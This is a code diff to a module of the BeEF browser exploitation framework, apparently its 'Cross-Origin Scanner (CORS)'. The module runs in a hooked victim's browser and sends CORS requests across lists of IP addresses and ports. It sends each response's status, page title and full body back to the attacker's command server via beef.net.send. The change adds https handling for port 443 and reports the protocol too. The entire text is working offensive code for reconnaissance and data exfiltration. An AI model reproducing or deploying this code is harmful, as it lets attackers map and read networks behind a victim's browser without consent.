@@ -100,10 +100,10 @@ beef.execute(function() {
   }
 
   // send CORS request to each IP
-  var proto = 'http';
   for (var i=0; i < ips.length; i++) {
     var worker = workers[i % threads];
     for (var p=0; p < ports.length; p++) {
+      if (ports[p] == '443') var proto = 'https'; else var proto = 'http';
       var url = proto + '://' + ips[i] + ':' + ports[p];
       worker.queue('beef.debug("[Cross-Origin Scanner (CORS)] Fetching URL: '+url+'");' +
       'beef.net.cors.request(' +
@@ -111,7 +111,7 @@ beef.execute(function() {
        'if (response != null && response["status"] != 0) {' +
         'beef.debug("[Cross-Origin Scanner (CORS)] Received response from '+url+': " + JSON.stringify(response));' +
         'var title = response["body"].match("<title>(.*?)<\\/title>"); if (title != null) title = title[1];' +
-        'beef.net.send("<%= @command_url %>", <%= @command_id %>, "ip='+ips[i]+'&port='+ports[p]+'&status="+response["status"]+"&title="+title+"&response="+JSON.stringify(response));' +
+        'beef.net.send("<%= @command_url %>", <%= @command_id %>, "proto='+proto+'&ip='+ips[i]+'&port='+ports[p]+'&status="+response["status"]+"&title="+title+"&response="+JSON.stringify(response));' +
        '}' +
       '});'
       );
